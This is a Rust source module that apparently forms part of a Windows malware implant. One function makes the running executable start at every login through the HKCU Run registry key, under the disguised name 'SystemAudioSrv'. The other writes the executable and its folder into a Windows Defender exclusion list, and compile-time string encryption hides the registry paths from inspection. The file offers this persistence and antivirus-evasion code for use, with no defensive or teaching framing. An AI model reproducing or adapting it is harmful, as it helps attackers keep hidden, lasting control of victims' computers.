//! Persistence and startup helpers.
//! All registry key/value name strings are encrypted at compile time
//! via `cryptify` — they are not visible as plain text in the binary.

use cryptify::encrypt_string;
use winreg::enums::{HKEY_CURRENT_USER, REG_DWORD};
use winreg::RegKey;

/// Registers the current executable to run automatically on user login.
/// Writes to HKCU\Software\Microsoft\Windows\CurrentVersion\Run (no admin needed).
pub fn install() {
    let exe_path = match std::env::current_exe() {
        Ok(p) => p,
        Err(_) => return,
    };
    let exe_str = exe_path.to_string_lossy().into_owned();

    // Registry path and value name are decrypted in RAM only at this point.
    let reg_path  = encrypt_string!("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    let val_name  = encrypt_string!("SystemAudioSrv");

    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    if let Ok((key, _)) = hkcu.create_subkey(&reg_path) {
        let _ = key.set_value(&val_name, &exe_str);
    }
}

/// Adds the current executable and its parent directory to Windows Defender's
/// exclusion list by writing to HKCU — no Administrator rights required.
pub fn exclude_from_defender() {
    let exe_path = match std::env::current_exe() {
        Ok(p) => p,
        Err(_) => return,
    };

    // Registry path is decrypted in RAM only at this point.
    let exclusions_path = encrypt_string!(
        "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
    );

    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let exclusions_key = match hkcu.create_subkey(&exclusions_path) {
        Ok((k, _)) => k,
        Err(_) => return,
    };

    let dword_zero = winreg::RegValue {
        bytes: vec![0u8; 4],
        vtype: REG_DWORD,
    };

    let exe_str = exe_path.to_string_lossy().into_owned();
    let _ = exclusions_key.set_raw_value(&exe_str, &dword_zero);

    if let Some(dir) = exe_path.parent() {
        let dir_str = dir.to_string_lossy().into_owned();
        let _ = exclusions_key.set_raw_value(&dir_str, &dword_zero);
    }
}
